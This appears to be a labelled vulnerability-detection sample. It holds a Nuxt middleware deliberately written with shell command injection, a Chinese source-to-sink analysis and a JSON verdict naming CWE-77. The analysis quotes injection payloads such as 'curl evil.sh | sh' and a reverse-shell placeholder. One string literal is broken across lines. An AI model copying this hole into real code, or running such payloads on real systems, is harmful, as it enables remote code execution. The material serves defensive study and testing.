@@ -1,0 +1,55 @@
+LANG: javascript
+```javascript
+// server/middleware/auth-chain.ts
+import { defineEventHandler, getRequestURL, getQuery, createError } from 'h3'
+import { exec } from 'child_process'
+import { promisify } from 'util'
+
+const execAsync = promisify(exec)
+
+// 鉴权中间件链：根据请求中的 workspace 参数定位用户工作区并校验 token
+export default defineEventHandler(async (event) => {
+  const url = getRequestURL(event)
+  if (!url.pathname.startsWith('/api/workspace')) return
+
+  const query = getQuery(event)
+  const workspaceDir = String(query.workspace || process.cwd())
+  const token = String(query.token || '')
+
+  // 第一步：token 校验（与命令执行无关，不构成对 sink 的防御）
+  if (!token.startsWith('sk_')) {
+    throw createError({ statusCode: 401, statusMessage: 'invalid token' })
+  }
+
+  // 第二步：用 shell find 定位该工作区下的部署配置文件
+  // workspaceDir 直接来自请求参数，未经任何过滤即拼入 shell 命令
+  try {
+    const { stdout } = await execAsync(
+      `find "${workspaceDir}" -name "serverless.yml" -not -path "*/node_modules/*"`,
+      { maxBuffer: 10 * 1024 * 1024 },
+    )
+
+    const configFiles = stdout.trim().split('
+').filter(Boolean)
+
+    // 第三步：读取每个配置文件提取 service 名（同样使用外部输入拼接）
+    for (const file of configFiles) {
+      await execAsync(`head -n 20 "${file}"`)
+    }
+
+    event.context.configFiles = configFiles
+  } catch (error) {
+    console.error('Error scanning workspace:', error)
+    event.context.configFiles = []
+  }
+})
+```
+
+1. **第 13 行**：source 为 `getQuery(event)` 取出的 `query.workspace`，这是 Nuxt/Nitro 中间件里地道的外部输入入口；它经第 14 行 `String()` 转换后赋给 `workspaceDir`，随后在第 27 行直接模板字符串拼入 `execAsync` 执行的 `find` 命令——source 到 sink 完全可达。
+2. **第 19 行**：唯一的校验是 `token.startsWith('sk_')`，这是鉴权检查而非输入净化，且 token 与 workspace 是两个独立参数；攻击者只需携带合法格式 token 即可让任意 workspace 字符串进入第 27 行的 shell 拼接。`String()` 仅做类型转换，不构成防御。
+3. **第 26-28 行**：sink 是 `execAsync(...)`（底层 `child_process.exec`，默认走 `/bin/sh -c`）。攻击者可提交 `workspace=/tmp; curl evil.sh | sh` 或 `$(reverseshell)` 等注入载荷，双引号包裹可用 `"` 或反引号闭合绕过，实现任意命令执行。第 35 行 `head -n 20 "${file}"` 构成第二处 sink：file 来自第一条注入流的 stdout，攻击者可通过在磁盘放置含恶意文件名的路径或利用第一条流间接控制，形成第二入口/替代通道。
+4. **结论**：两条数据流（workspace→find、stdout 文件名→head）均无任何转义、白名单或参数化执行（未用 `execFile`/数组参数形式），黑名单式过滤完全缺失，确认 CWE-77 命令注入成立。
+
+```json
+{"has_vulnerability": true, "vulnerability_type": "CWE-77 Command Injection", "risk_level": "Critical", "source": "line 13: getQuery(event) 取出的 query.workspace 外部输入", "sink": "line 27: execAsync 拼接执行的 child_process.exec 命令", "explanation": "主链：line 13 的 query.workspace 经 String 转换后于 line 27 直接模板字符串拼入 execAsync 执行的 find 命令，无任何过滤或转义 -> 攻击者可用分号/反引号闭合双引号注入任意 shell 命令；第二链：line 35 head 命令以第一条流的 stdout 文件名再次拼接执行，构成替代通道；line 19 的 token.startsWith 校验仅为鉴权且不作用于 workspace 参数，不构成有效防御", "fix_suggestion": "line 27: 改用 execFile 并以数组传参（如 execFile('find', [workspaceDir, '-name', 'serverless.yml'])），或对 workspaceDir 做白名单路径规范化校验后再传入"}
+```
